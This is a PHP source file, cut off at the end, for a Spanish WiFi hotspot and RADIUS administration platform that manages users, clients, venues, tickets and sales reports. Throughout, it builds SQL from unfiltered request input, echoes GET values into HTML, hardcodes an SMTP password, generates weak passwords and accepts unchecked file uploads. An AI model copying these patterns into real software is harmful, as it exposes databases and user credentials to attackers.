<?php
/**
 * Splits the REQUEST_URI to load the right template and controller.
 * @global array $pages Includes the allowed pages. If the request doesn't match, index.php will be shown as default.
 * @param array $getparams includes the REQUEST_URI.
 * @return array Returns the page that shall be displayed and the key-value-pairs for the controller. 
 */
function getTemplateData($getparams) {
    global $pages;    
    $get_values = array();
    if (empty($getparams)) {  
        header('Location: '.DOMAIN.'/inicio');
        die();
    } else {    
        $params_parts = explode('/', $getparams['q']);
        foreach ($params_parts as $key => $value) if (!empty($value)) $get_values[$key] = $params_parts[$key];
        if(isset($get_values[0])){
            define(COUNTRY, $get_values[0]);
            if (!in_array($get_values[0], $pages)) {    //If no page is found, try to find
                if (function_exists('external_'.$get_values[0])) {   //a function or error
                    array_shift($_GET);
                    call_user_func_array('external_'.$get_values[0], $_GET);
                } elseif($get_values[0] == 'olrai'){ file_put_contents(getcwd()."/olrai.txt", 'data');
                } else {
                    // If no function and page is found send 404 code
                    header('Location:'.DOMAIN.'/404.html');
                }
            }
        } else {
            header('Location: '.DOMAIN.'/inicio');
            die();
        }
    }
    return $get_values;
}

function get_subdoamin() {
    global $database;
    $subdomain = strstr($_SERVER['SERVER_NAME'], '.www.plataforma.openwebcanarias.es/', TRUE);   //se extrae la parte delante de subdomain si no hay .servinet se devuelve false
    if (strpos($subdomain, '.')) {
        $cliente = strstr($subdomain, '.', TRUE);
        $local = substr($subdomain, strpos($subdomain, '.')+1);
    } else {
        $cliente = $subdomain;
    }
    if (($cliente != 'www') && ($cliente != FALSE )) {
        $result = $database->query((isset($local))?"SELECT clientes.nombre as cliente, locales.nombre as locale FROM `clientes` LEFT JOIN locales ON clientes.id = locales.cliente WHERE clientes.nombre = '$cliente' and locales.nombre = '$local'":"SELECT clientes.nombre as cliente FROM `clientes` WHERE clientes.nombre = '$cliente'");
        if ($result->num_rows > 0) {
            $_SESSION['cliente'] = $cliente;
            if (isset($local)) $_SESSION['local']=$local;
        } else {
            header('Location: '.DOMAIN.'/404.html');
        }
    } else {
        $_SESSION['cliente'] = 'admin';
    }
}
/**
 * Prints out array content and die (if it's setted)
 * @param type $array
 * @param type $die
 */
function dump($array, $die=false) {
    echo '<pre>';
    print_r($array);
    echo '</pre>';
    if ($die) die();
}
/*--------------------------------------------------------------------------*
 *                              LOGIN FUNCTIONS                             *
 *--------------------------------------------------------------------------*/
function isLoggedIn() {
    if (isset($_SESSION['isLoggedIn'])) $log_allowed = $_SESSION['isLoggedIn'];
    else $log_allowed = false;
    return $log_allowed;
}

function external_salir() {
    $_SESSION['isLoggedIn'] = false;
    session_destroy();
    header ("Location: ".DOMAIN);
}
/*--------------------------------------------------------------------------*
 *                                 END                                      *
 *--------------------------------------------------------------------------*/
/*--------------------------------------------------------------------------*
 *                      INCLUDE JS AND CSS FUNCTIONS                        *
 *--------------------------------------------------------------------------*/
/**
 * Add code to header, specifying the file extension.
 * @param type $code
 * @param type $type js(default) or css.
 * @return string
 */
function include_header_content($code, $type= 'js') {
    global $includeheader;
    if ($type == 'js') {            //Depending the filetype the tag are added to the code.
        $includeheader['js'][]='<script type="text/javascript">'.str_replace(array("  ", "   ", "    ","     "), " ", str_replace(array("\r","\n", "\t"), "", $code)).'</script>';
    } elseif ($type == 'css') {
        $includeheader['css'][]='<style type="text/css">'.str_replace("  ", " ", str_replace(array("\r","\n"), "", $code)).'</style>';
    }
}
/**
 * This function add a file which is stored in script folder or in a URL. Is not needed to specify
 * the file extension, in case that its an URL.
 * @param type $file
 * @return string
 */
function include_header_file($file){
    global $includeheader;
    global $fulldomain;
    if (file_exists($fulldomain.'/scripts/'.$file.'.js')) {
        $includeheader['js'][]='<script type="text/javascript" src="'.DOMAIN.'/scripts/'.$file.'.js"></script>';
    }
    if (file_exists($fulldomain.'/scripts/'.$file.'.css')) {
        $includeheader['css'][]='<link rel="stylesheet" type="text/css" media="all" href="'.DOMAIN.'/scripts/'.$file.'.css"/>';
    }
    if (stristr($file, "http")&& stristr($file, "js")) {
        $includeheader['js'][]='<script type="text/javascript" src="'.$file.'"></script>';
    }
    if (stristr($file, "http")&& stristr($file, "css")) {
        $includeheader['css'][]='<link rel="stylesheet" href="'.$file.'"/>';
    }
    $includeheader['js'] = array_unique($includeheader['js']);
    $includeheader['css'] = array_unique($includeheader['css']);
}
/**
 * Include all js and css files stored in to the specified folder.
 * @param type $name
 * @return string
 */
function load_modul($name) {
    global $includeheader;
    global $fulldomain;
    if (is_dir($fulldomain.'/scripts/'.$name)) {                //Check that folder exist and open it to loop into it
       if ($dh = opendir($fulldomain.'/scripts/'.$name)) {
            while (($file = readdir($dh)) !== false) {
                if (filetype($fulldomain.'/scripts/'.$name.'/'.$file)=='file') {
                    if (end(explode(".", $file))== "js") {      //For each file check if it is a js
                        $includeheader['js'][]='<script type="text/javascript" src="'.DOMAIN.'/scripts/'.$name.'/'.$file.'"></script>';
                    }                                           //or css file to add it.
                    if (end(explode(".", $file))== 'css') {
                        $includeheader['css'][]='<link rel="stylesheet" type="text/css" media="all" href="'.DOMAIN.'/scripts/'.$name.'/'.$file.'"/>';
                    }
                }
                    
            }
            closedir($dh);
        }
    }
}
/*--------------------------------------------------------------------------*
 *                                 END                                      *
 *--------------------------------------------------------------------------*/
/*--------------------------------------------------------------------------*
 *                          EXTERNAL FUNCTIONS                              *
 *--------------------------------------------------------------------------*/

/**
 * Send text given to vorgang id email given by email.
 * @global type $database
 */
function external_send_mail($correo = NULL, $pass = NULL){
    if ($correo == NULL) {
        if (isset($_POST['correoelec'])) {
            $correo = $_POST['correoelec'];         //Si no hay correo es que se llama de forma externa
        } else {
            die('Vacio');
        }
    }
    global $database;
    $result = $database->query("SELECT * FROM users WHERE email ='".$correo."'");
    if ($result->num_rows == 1) {
        $aux = $result->fetch_assoc();
        require 'scripts/phpmailer/PHPMailerAutoload.php';
        $mail = new PHPMailer;
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = TRUE;
        $mail->Port = 465;
        $mail->SMTPSecure='ssl';
        $mail->Username = 'no-reply@servibyte.com';
        $mail->Password = 'e3b7ep2K2';
        $mail->SetLanguage('es', 'scripts/phpmailer/phpmailer.lang-es.php');
        $mail->From = 'no-reply@servibyte.com';
        $mail->FromName = 'Servibyte.com';
        $mail->AddAddress($correo, utf8_decode($aux['nombre']));
        $mail->IsHTML();
        $mail->Subject = utf8_decode('Su nueva contraseña');
        if ($pass == NULL) $pass = substr(md5(time()), 3, 6);
        $mail->msgHTML(utf8_decode('Contraseña generada:<br>'.$pass));
        if($mail->send()) {
            echo 'Se le ha enviado el correo con la nueva contraseña';
            //$database->query("UPDATE users SET pass=MD5('$pass') WHERE email='".$correo."'");
        } else {
            echo 'No se pudo enviar el correo electrónico, por favor póngase en contacto con nosotros';
        }
    } else echo "El usuario no existe.";
if (isset($_POST['correoelec'])) die();
}
/**
 * Actualizar los permisos de los usuarios
 * @global type $fulldomain
 * @global type $database
 */
function external_actualiza_permiso() {
//    global $fulldomain;
//    file_put_contents($fulldomain.'/perm', print_r($_POST, TRUE));
    if (isset($_POST['usuario']) && isset($_POST['cliente']) && isset($_POST['accion'])) if (is_numeric($_POST['usuario']) && is_numeric($_POST['cliente']) && is_numeric($_POST['accion'])) {
     global $database;
     if ($database->query(($_POST['accion'] == 1)?"INSERT INTO `permisos`(`usuario`, `cliente`".((!empty($_POST['local']))?", `local`":"").") VALUES ('".$_POST['usuario']."','".$_POST['cliente']."'".((!empty($_POST['local']))?", '".$_POST['local']."'":"").")":"DELETE FROM `permisos` WHERE usuario='".$_POST['usuario']."' AND cliente='".$_POST['cliente']."' AND local".((!empty($_POST['local']))?"='".$_POST['local']."'":" IS NULL"))) die();
 }
}
function external_edita_usuarios($data = NULL) {
    global $fulldomain;
    $ajax = FALSE;
    if ($data == NULL) {
        $ajax = TRUE;
        $data = $_POST;
    }
    if (isset($data['accion']) && isset($data['table'])) if (($data['accion'] == 'eliminar') || ($data['accion'] == 'editar')) {
        global $database;
        if (($data['accion'] == 'eliminar') && is_numeric($data['idusuario'])) {
            if ($database->query('DELETE FROM permisos WHERE '.(($data['table'] == 'users')?'usuario':(($data['table']== 'locales')?'local':(($data['table']=='clientes')?'cliente':''))).'='.$data['idusuario'])) {
                if ($data['table'] == 'clientes') {
                    $result = $database->query("SELECT clientes.*, locales.nombre as nlocal, locales.id as idlocal FROM clientes left join locales on clientes.id = locales.cliente where clientes.id = ".$data['idusuario']);
                    while ($aux = $result->fetch_assoc()) {
                        if (!empty($aux['nlocal'])) {
                            //borrar los locales, llamando recursivamente?
                            $data2 = $data;
                            $data2['table'] = 'locales';
                            $data2['idusuario'] = $aux['idlocal'];
                            external_edita_usuarios($data2);
                        }
                        if (is_file($fulldomain.'/images/logos/'.strtolower($aux['nombre'].'.png')))  unlink($fulldomain.'/images/logos/'.strtolower($aux['nombre'].'.png'));
                    }
                } elseif ($data['table'] == 'locales') {
                    $result = $database->query("SELECT clientes.*, locales.nombre as nlocal FROM locales left join clientes on clientes.id = locales.cliente where locales.id = ".$data['idusuario']);
                    while ($aux = $result->fetch_assoc()) if (is_file(unlink($fulldomain.'/images/logos/'.strtolower($aux['nombre'].'.'.strtolower($aux['nlocal']).'.png')))) unlink($fulldomain.'/images/logos/'.strtolower($aux['nombre'].'.'.strtolower($aux['nlocal']).'.png'));
                }
                if ($database->query('DELETE FROM '.$data['table'].' WHERE id='.$data['idusuario'])) {
                    if (!$ajax) {
                        return true;
                    } else {
                        die();      //Si la llamada se hace por ajax, si que hace falta el dia, pero si es dentro del sistem no.
                    }
                }
            }  
        } elseif ($data['accion'] == 'editar') {
            switch ($data['table']) {
                case 'usuarios':
                    if ($database->query("UPDATE `users` SET nombre= '".$data['nombre']."', email= '".$data['email']."' WHERE id='".$data['id']."'")) die();
                    break;
                case 'clientes':
                    if ($database->query("UPDATE `clientes` SET nombre= '".$data['nombre']."' WHERE id='".$data['id']."'")) die();
                    break;
                case 'locales':
                    if ($database->query("UPDATE `locales` SET nombre='".$data['nombre']."', cliente='".$data['local']."' WHERE id='".$data['id']."'")) die();
                    break;
            }
        } 
    }
}

function external_guardar_usuario() {
    //file_put_contents('usuarios', print_r($_POST, true));
    if ((!empty($_POST['nombre'])) && (!empty($_POST['correo'])) && (!empty($_POST['envia']))) {
        global $database;
        if ($_POST['action'] == 1) {
            if ($database->query("DELETE FROM users WHERE id = ".$_POST['id'])) if ($database->query("DELETE from permisos WHERE usuario =".$_POST['id'])) die();
        } else {
            if (empty($_POST['id'])) {
                if ($database->query("INSERT INTO `users`(`nombre`, `pass`, `email`) VALUES ('".$_POST['nombre']."','".md5($_POST['pass'])."','".$_POST['correo']."')")) {
                    if ($_POST['envia'] == 'true') external_send_mail($_POST['correo'], $_POST['pass']);
                    die();
                }
            } else {
                if ($database->query("UPDATE `users` SET `nombre`='".$_POST['nombre']."',".((empty($_POST['pass']))?"":"`pass`='".md5($_POST['pass'])."',")."`email`='".$_POST['correo']."' WHERE `id`=".$_POST['id'])) {
                    if ($_POST['envia'] == 'true') external_send_mail($_POST['correo'], $_POST['pass']);
                    die();
                }
            }
        }
    }
}

function external_guardar_cliente() {
    if (!empty($_POST['nombre'])) {
        global $database;
        if ($_POST['action'] == 1) {
            // Al borrar un cliente, habría que borrar los locales que tiene ese cliente, por lo que al borrar un local habría que borrar tambíen los hotspot de ese local con sus perfiles y lotes.
            // Tambíen hay que modificar el nombre de las imagenes asociadas a ellos.
            // Nota: Se podría cambiar el nombre de las imagenes a los ids de los locales y clientes para solucionar este problema.
            if ($database->query("DELETE FROM `clientes` WHERE `id` = ".$_POST['id'])) if ($database->query("DELETE FROM `permisos` WHERE `cliente`=".$_POST['id'])) {
                if (file_exists($fulldomain.'/images/logos/'.strtolower($_POST['nombre']).'.png')) {
                    if (unlink($fulldomain.'/images/logos/'.strtolower($_POST['nombre']).'.png')) {
                        die();
                        // Aqui es donde se llamaría a eliminar local
                    }
                }
            }
        } else {
            if (empty($_POST['id'])) {
                if ($database->query("INSERT INTO `clientes`( `nombre`) VALUES ('".$_POST['nombre']."')")) die();
            } else {
                $result = $database->query("SELECT * FROM `clientes` WHERE `id`=".$_POST['id']);
                $aux = $result->fetch_assoc();
                global $fulldomain;
                if ($database->query("UPDATE `clientes` SET `nombre`='".$_POST['nombre']."' WHERE `id`=".$_POST['id'])) {
                    if (file_exists($fulldomain.'/images/logos/'.strtolower($aux['nombre']).'.png')) {
                        if (rename($fulldomain.'/images/logos/'.strtolower($aux['nombre']).'.png', $fulldomain.'/images/logos/'.strtolower($_POST['nombre']).'.png')) die();   
                    }
                }
            }
        }
    }
}

function external_guardar_local() {
    if ((!empty($_POST['nombre'])) && (!empty($_POST['cliente'])) && (!empty($_POST['clientenombre']))) {
        global $database;
        if ($_POST['action'] == 1) {
            if ($database->query("DELETE FROM `locales` WHERE `id` = ".$_POST['id'])) if ($database->query("DELETE FROM `permisos` WHERE `local`=".$_POST['id'])) {
                if (file_exists($fulldomain.'/images/logos/'.strtolower($_POST['clientenombre']).'.'.strtolower($_POST['nombre']).'.png')) {
                    if (unlink($fulldomain.'/images/logos/'.strtolower($_POST['clientenombre']).'.'.strtolower($_POST['nombre']).'.png')) {
                        die();
                        // Aqui es donde se llamaría a eliminar local
                    }
                }
            }
        } else {
            if (empty($_POST['id'])) {
                if ($database->query("INSERT INTO `locales`(`nombre`, `cliente`) VALUES ('".$_POST['nombre']."',".$_POST['cliente'].")")) die();
            } else {
                $result = $database->query("SELECT locales.nombre, clientes.nombre as clientenombre FROM `locales` INNER JOIN `clientes` ON locales.cliente = clientes.id  WHERE locales.id=".$_POST['id']);
                $aux = $result->fetch_assoc();
                global $fulldomain;
                if ($database->query("UPDATE `locales` SET `nombre`='".$_POST['nombre']."', `cliente`=".$_POST['cliente']." WHERE `id`=".$_POST['id'])) {
                    if (file_exists($fulldomain.'/images/logos/'.strtolower($aux['clientenombre']).'.'.strtolower($aux['nombre']).'.png')) {
                        if (rename($fulldomain.'/images/logos/'.strtolower($aux['clientenombre']).'.'.strtolower($aux['nombre']).'.png', $fulldomain.'/images/logos/'.strtolower($_POST['clientenombre']).'.'.strtolower($_POST['nombre']).'.png')) die();   
                    }
                }
            }
        }
    }
}

function external_upload_logo() {
    global $fulldomain;
    foreach ($_FILES as $file) {
        if (move_uploaded_file($file['tmp_name'], $fulldomain.'/images/logos/'.strtolower($_POST['nombre']).(($_POST['local'])?'.'.strtolower($_POST['local']):'').'.png')) die();
    }
    
}
function external_edita_menus() {
    if (isset($_POST['user']) && isset($_POST['menu']) && isset($_POST['action'])) if (intval($_POST['user']) && ($_POST['action']) == 'add' || $_POST['action'] == 'del') {
        global $database;
        if ($database->query("UPDATE users SET menu_".  strtolower($_POST['menu'])."=".($_POST['action']== 'add' ? 1 : 0)." WHERE id=".$_POST['user'])) die();
    }
}
function external_quitar_menu() {
    if (!empty($_POST['menu'])) if (substr($_POST['menu'], 0, 5) == 'menu_') {
        global $database;
        if ($_POST['action'] == 1) {
            if ($database->query('ALTER TABLE `users` DROP `'.strtolower($_POST['menu']).'`;')) die();
        } elseif ($_POST['action'] == 0) {
            if ($database->query("ALTER TABLE `users` ADD `".  strtolower($_POST['menu'])."` INT(1) NOT NULL DEFAULT '0' ;")) die();
        }  
    }
}
function external_guardar_hotspot(){
    //global $fulldomain;
    //file_put_contents('hotspots', print_r($_POST, true));
    if ((!empty($_POST['name'])) && (!empty($_POST['status'])) && (!empty($_POST['local'])) && (!empty($_POST['informe']))) {
        global $database;
        global $radius;
        if ($_POST['action'] == 1) {
            if ($database->query('DELETE FROM `hotspots` WHERE id="'.$_POST['id'].'"')) {
                if ($radius->query('DELETE FROM `radgroupcheck` WHERE `groupname` = "'.$_POST['local'].'" AND `value`= "'.$_POST['name'].'"')) die();
            }
        } else {
            if (empty($_POST['id'])){
                $database->query('INSERT INTO `hotspots`(`ServerName`, `SerialNumber`, `Status`, `Local`, `Informe`,`si`) VALUES ("'.$_POST['name'].'",'.((empty($_POST['number']))?"NULL":'"'.$_POST['number'].'"').',"'.$_POST['status'].'","'.$_POST['local'].'","'.$_POST['informe'].'",'.((empty($_POST['si']))?'NULL':(($_POST['si']==0)?'NULL':'"'.$_POST['si'].'"')).')');
                $radius->query('INSERT INTO `radgroupcheck`(`groupname`, `attribute`, `op`, `value`) VALUES ("'.$_POST['name'].'","Called-Station-Id","==","'.$_POST['name'].'")');
                $radius->query("INSERT INTO `radius`.`radgroupreply` (`groupname`, `attribute`, `op`, `value`) VALUES ('".$_POST['name']."', 'Acct-Interim-Interval', ':=', '600')");
            } else {
                $temporal = $database->query('SELECT * FROM hotspots WHERE id = "'.$_POST['id'].'"');
                $aux = $temporal->fetch_assoc();
                if ($database->query('UPDATE `hotspots` SET `ServerName`="'.$_POST['name'].'",`SerialNumber`='.((empty($_POST['number']))?"NULL":'"'.$_POST['number'].'"').',`Status`="'.$_POST['status'].'",`Local`="'.$_POST['local'].'",`Informe`="'.$_POST['informe'].'",`si`='.(($_POST['si']=='Cliente')?"NULL":(($_POST['si']==0)?'NULL':'"'.$_POST['si'].'"')).' WHERE id="'.$_POST['id'].'"')) {
                    if ($radius->query('UPDATE `radgroupcheck` SET `groupname` = "'.$_POST['local'].'", `value`= "'.$_POST['name'].'" WHERE groupname="'.$aux['Local'].'" AND value = "'.$aux['ServerName'].'"')) die();
                }
            }
                
        }
    }
}
function external_guardar_perfil() {
    global $database;
    if (count($_POST) > 14) {
        if ($_POST['action']== 1) {
            if ($database->query('DELETE FROM perfiles WHERE Id = '.$_POST['per_0'])) die();
        } else {
            if (empty($_POST['per_0'])) {
                $sql='INSERT INTO `perfiles`(`Id_hotspot`, `ServerName`, `Descripcion`, `Duracion`, `Movilidad`, `ModoConsumo`, `Acct-Interim-Interval`, `Idle-Timeout`, `Simultaneous-Use`, `Login-Time`, `Expiration`, `WISPr-Bandwidth-Max-Down`, `WISPr-Bandwidth-Max-Up`, `TraficoDescarga`, `Password`) VALUES (';
                for ($index = 1; $index < 16; $index++) $sql.='"'.((!empty($_POST['per_'.$index]))?$_POST['per_'.$index]:'').'",';
                $sql = substr($sql, 0, -1).')';
                //file_put_contents('perfiles', $sql, 8);
                if ($database->query($sql)) die();
            } else {
                if ($database->query('UPDATE `perfiles` SET `Id_hotspot`="'.$_POST['per_1'].'",`ServerName`="'.$_POST['per_2'].'",`Descripcion`="'.$_POST['per_3'].'",`Duracion`="'.$_POST['per_4'].'",`Movilidad`="'.$_POST['per_5'].'",`ModoConsumo`="'.$_POST['per_6'].'",`Acct-Interim-Interval`="'.$_POST['per_7'].'",`Idle-Timeout`="'.$_POST['per_8'].'",`Simultaneous-Use`="'.$_POST['per_9'].'",`Login-Time`="'.$_POST['per_10'].'",`Expiration`="'.$_POST['per_11'].'",`WISPr-Bandwidth-Max-Down`="'.$_POST['per_12'].'",`WISPr-Bandwidth-Max-Up`="'.$_POST['per_13'].'",`TraficoDescarga`="'.$_POST['per_14'].'",`Password`="'.$_POST['per_15'].'" WHERE id = '.$_POST['per_0'])) die ();
            }
        }
    }
}
function external_guardar_lote() {
    global $database;
    if (!empty($_POST['id_perfil']) && !empty($_POST['duracion']) && (strlen($_POST['costo'])>0) && (strlen($_POST['precio'])>0)) {
        if ($_POST['action']== 1) {
            if ($database->query('DELETE FROM lotes WHERE Id = '.$_POST['id'])) die();
        } elseif ($_POST['action']== 0) {
            if (empty($_POST['id'])) {
                if ($database->query('INSERT INTO `lotes`(`Id_perfil`, `Duracion`, `Costo`, `Precio`) VALUES ("'.$_POST['id_perfil'].'", "'.$_POST['duracion'].'", "'.$_POST['costo'].'", "'.$_POST['precio'].'")')) die();
            } else {
                if ($database->query('UPDATE `lotes` SET `Id_perfil`="'.$_POST['id_perfil'].'",`Duracion`="'.$_POST['duracion'].'",`Costo`="'.$_POST['costo'].'",`Precio`="'.$_POST['precio'].'" WHERE `Id`='.$_POST['id'])) die ();
            }
        }
    } 
}
function external_crea_ticket() {
    global $fulldomain;
//    file_put_contents($fulldomain.'/crearticket', print_r($_POST, TRUE));
    if (isset($_POST['movilidad']) && isset($_POST['servername']) && isset($_POST['modoconsumo']) && isset($_POST['acctInterimInterval']) && isset($_POST['idleTimeout']) && isset($_POST['simultaneousUse']) && isset($_POST['loginTime']) && isset($_POST['expiration']) && isset($_POST['wisprBandwidthMaxDown']) && isset($_POST['wisprBandwidthMaxUp']) && isset($_POST['traficodescarga']) && isset($_POST['duracion']) && isset($_POST['lotesid']) && isset($_POST['precio']) && isset($_POST['identificador']) && isset($_POST['password'])) {        //Devolver usuario y contraseña de la siguente forma: user=$usuario&pass=$contrasena
        global $radius;
        global $database;
        
        $exists = false;
        while (!$exists) {
            $usuario = usuario_aleatorio('CVCVCVNN', 8);
            $aux = $radius->query('SELECT * FROM radusergroup where username = '.$_POST['servername'].'_'.$usuario);
            if ($aux->num_rows == 0) $exists = true;
        }
        $contrasena = (empty($_POST['password'])?usuario_aleatorio('CVCVCVNN', 8):(($_POST['password'] == 'usuario')?$usuario:$_POST['password']));
        if ($radius->query("INSERT INTO `radusergroup`(`username`, `groupname`, `priority`) VALUES ('".$_POST['servername'].'_'.$usuario."','".$_POST['servername']."',1)")) {
            if ($radius->query("INSERT INTO `radcheck`( `username`, `attribute`, `op`, `value`) VALUES ('".$_POST['servername'].'_'.$usuario."','Cleartext-Password',':=','$contrasena')")) {
                if ($radius->query("INSERT INTO `radcheck`( `username`, `attribute`, `op`, `value`) VALUES ('".$_POST['servername'].'_'.$usuario."','Called-Station-Id','==','".$_POST['servername']."')")) {
                    foreach ($_POST as $key => $elem) {
                        if ((!empty($elem)) && ($elem!= '0000-00-00')) {
                            switch ($key) {
                                case "wisprBandwidthMaxUp":
                                    $radius->query("INSERT INTO `radcheck`( `username`, `attribute`, `op`, `value`) VALUES ('".$_POST['servername'].'_'.$usuario."','WISPr-Bandwidth-Max-Up',':=','$elem')");
                                    break;
                                case "wisprBandwidthMaxDown":
                                    $radius->query("INSERT INTO `radcheck`( `username`, `attribute`, `op`, `value`) VALUES ('".$_POST['servername'].'_'.$usuario."','WISPr-Bandwidth-Max-Down',':=','$elem')");
                                    break;
                                case "modoconsumo":
                                    $radius->query("INSERT INTO `radcheck`( `username`, `attribute`, `op`, `value`) VALUES ('".$_POST['servername'].'_'.$usuario."','$elem',':=','".$_POST['duracion']."')");      //Continuo hay dos tipos?
                                    break;
                                case 'traficodescarga':
                                    $radius->query("INSERT INTO `radcheck`( `username`, `attribute`, `op`, `value`) VALUES ('".$_POST['servername'].'_'.$usuario."','Max-All-MB',':=','$elem')");
                                    break;
                                case 'expiration':
                                    $radius->query("INSERT INTO `radcheck`( `username`, `attribute`, `op`, `value`) VALUES ('".$_POST['servername'].'_'.$usuario."','Expiration',':=','".date('d M Y', strtotime($elem))." 0:00')");
                                    break;
                                    //añadir tb la hora en el selector
                                //Faltan metodos roamin
                                //meter en el hotspot acctinterinteval y el idletimeout
                                
                            }
                        }  
                    }
                    $database->query("INSERT INTO `ventashotspot`(`Id_Lote`, `FechaVenta`, `Usuario`, `Precio`, `identificador`) VALUES ('".$_POST['lotesid']."',NOW(),'".$_POST['servername'].'_'.$usuario."','".$_POST['precio']."','".$_POST['identificador']."')");
                }   
            }  
        }    
        
        echo (($_POST['password'] == 'usuario')?(($_POST['servername'] == "coronablanca")?"user=$usuario&full=corona.png&identificador=".$_POST['identificador']."&precio=".$_POST['precio']."&duracion=".$_POST['duracion']:"user=$usuario"):"user=$usuario&pass=$contrasena");
        die();
    }
}
function external_imprimeticket(){
    if (isset($_GET['user']) && isset($_GET['pass'])) {
        $html='<html>
	<head>
		<style type="text/css">
			body {
				width: 500px;
				height: 500px;
			}
		</style>
	</head>
	<body>
		<div>
			<img src="/images/logo.png">
		</div>
		<div>
			<p>User '.$_GET['user'].'</p>
			<p>Pass '.$_GET['pass'].'</p>
		</div>
	</body>
</html>';
        //echo $html;
        die($html);
    }
}

function external_cancela_ticket() {
    global $radius;
    global $database;
    global $fulldomain;
    if (isset($_POST['usuario']) && (isset($_POST['motivo'])) && (isset($_POST['anuluser']))) {
        if ($radius->query("INSERT INTO `radcheck`(`username`, `attribute`, `op`, `value`) VALUES ('".$_POST['usuario']."','Auth-Type',':=','Reject')")) {
            if ($database->query("UPDATE `ventashotspot` SET `comentario`='".$_POST['motivo']."', anulacion_fecha = NOW(), anulacion_usuario = '".$_POST['anuluser']."' WHERE `Usuario`='". $_POST['usuario']."'")) die();
        }
    }
}

function external_desanular_ticket() {
    global $radius;
    global $database;
    if (isset($_POST['usuario'])) {
        if ($radius->query('DELETE FROM `radcheck` WHERE username = "'.$_POST['usuario'].'" AND value = "Reject"')){
            if ($database->query("UPDATE `ventashotspot` SET `comentario`=NULL, anulacion_fecha = NULL, anulacion_usuario = NULL WHERE `Usuario`='". $_POST['usuario']."'")) die();
        }
    }
}
function external_borrar_ticket() {
    global $radius;
    global $database;
    if (isset($_POST['usuario'])) {
        if ($radius->query('DELETE FROM `radcheck` WHERE username = "'.$_POST['usuario'].'"')){
            if ($radius->query('DELETE FROM `radacct` WHERE username = "'.$_POST['usuario'].'"')){
                if ($radius->query('DELETE FROM `radreply` WHERE username = "'.$_POST['usuario'].'"')){
                    if ($radius->query('DELETE FROM `radusergroup` WHERE username = "'.$_POST['usuario'].'"')){
                        if ($database->query("DELETE FROM `ventashotspot` WHERE `Usuario`='". $_POST['usuario']."'")) {
                            if ($database->query("DELETE FROM `facebook` WHERE `username` = '".$_POST['usuario']."'")) die();
                        }
                    }
                }
            }
        }
    }
}
function external_guardar_gasto(){
    global $database;
    if (isset($_POST['id']) && isset($_POST['hotspot']) && isset($_POST['cantidad']) && isset($_POST['Descripcion']) && isset($_POST['precio']) && isset($_POST['action'])) {
        if ($_POST['action'] == 1) {
            if ($database->query("DELETE FROM `gastos` WHERE id = ".$_POST['id'])) die();
        } elseif ($_POST['action'] == 0) {
            if (empty($_POST['id'])) {
                if ($database->query("INSERT INTO `gastos`(`hotspot`, `cantidad`, `Descripcion`, `precio`) VALUES (".$_POST['hotspot'].",".$_POST['cantidad'].",'".$_POST['Descripcion']."',".$_POST['precio'].")")) die();
            } else {
                if ($database->query("UPDATE `gastos` SET `hotspot`=".$_POST['hotspot'].",`cantidad`=".$_POST['cantidad'].",`Descripcion`='".$_POST['Descripcion']."',`precio`=".$_POST['precio']." WHERE `id`=".$_POST['id'])) die();
            }

        }
    }
}
function external_informepdf(){
    if (isset($_GET['id'])) {
        global $database;
        $result = $database->query("SELECT * FROM `historial` WHERE `id`='".$_GET['id']."'");
        if ($result->num_rows > 0) {
            $aux = $result->fetch_assoc();
            $in=array();
            for ($index = 1; $index < 16; $index++) {
                if (empty($aux['id_perfil'.$index])) {
                    break;
                } else {
                    $result = $database->query('SELECT Precio FROM lotes WHERE Id='.$aux['id_perfil'.$index]);
                    $precio = $result->fetch_assoc();
                    $in[$aux['id_perfil'.$index]]=array('cantidad'=>$aux['contador_perfil'.$index], 'usuarios' => explode(',', $aux['users_'.$index]), 'precio'=> $precio['Precio']);
                }
            }
            if (count($in)>0) {
                $result = $database->query("SELECT * FROM `hotspots` WHERE id = ".$aux['id_hotspot']);
                $hotspot = $result->fetch_assoc();
                pdf($in, $hotspot, TRUE, spanish(date('F', strtotime('- 1 month',strtotime($aux['fecha'])))),$_GET['modo']);
            }
        }  
        die();
    }
}

function external_informeventas(){
    if (isset($_GET['hotspot']) && isset($_GET['fechaini']) && isset($_GET['fechafin']) && isset($_GET['modo'])) {
        global $database;
        $result = $database->query("SELECT * FROM ventashotspot WHERE Usuario LIKE '".$_GET['hotspot']."\_%'".((!empty($_GET['fechaini']))?" AND FechaVenta > '".$_GET['fechaini']." 00:00:00'".((!empty($_GET['fechafin']))?" AND FechaVenta < '".$_GET['fechafin']." 23:59:59'":""):""));
        if ($result->num_rows > 0) {
            $out = array();
            while ($aux = $result->fetch_assoc()) {
                $out[] = array("usuario" => substr(strstr($aux['Usuario'], '_'), 1), "precio"=>$aux['Precio'], "identificador" => $aux['identificador'], 'lote'=>$aux['Id_Lote'], "anulado"=>$aux['anulacion_fecha']);
            }
            $suma = array();
            foreach ($out as $value) {
                if (empty($suma[$value['lote']])) {
                    $suma[$value['lote']] = array("cantidad" => ((!empty($value['anulado']))?0:1), "usuarios" => array($value['usuario'].((!empty($value['anulado']))?" ANULADO":"")), "precio" => $value['precio']);
                } else {
                    if (empty($value['anulado'])) $suma[$value['lote']]['cantidad'] = $suma[$value['lote']]['cantidad'] + 1;
                    $suma[$value['lote']]['usuarios'][] = $value['usuario'].((!empty($value['anulado']))?" ANULADO":"");
                    $suma[$value['lote']]['precio'] = $value['precio'];
                }
            }
            //dump($suma, true);
            if (count($suma)>0) {
                $result = $database->query("SELECT * FROM `hotspots` WHERE ServerName = '".$_GET['hotspot']."'");
                $hotspot = $result->fetch_assoc();
                pdf($suma, $hotspot, TRUE, spanish(date('F', strtotime(((empty($_GET['fechaini']))?"now":$_GET['fechaini'])))),$_GET['modo'], TRUE);
            }
        }
    }
}

function external_guardar_bloc(){
    if (isset($_POST['nombre']) && isset($_POST['descripcion']) && isset($_POST['id']) && isset($_POST['action'])) {
        global $database;
        if ($_POST['action'] == 1) {
            if ($database->query("DELETE FROM `blocs` WHERE id = ".$_POST['id'])) if ($database->query("DELETE FROM `bloc_usuarios` WHERE bloc_id = ".$_POST['id'])) die();
        } elseif ($_POST['action'] == 0) {
            if (empty($_POST['id'])) {
                if ($database->query('INSERT INTO `blocs`(`nombre`, `tiempo`, `descripcion`, `fecha`) VALUES ("'.$_POST['nombre'].'","'.$_POST['tiempo'].'","'.$_POST['descripcion']." (".$_POST['cantidad'].')",NOW())')) {
                    $blocid = $database->insert_id;
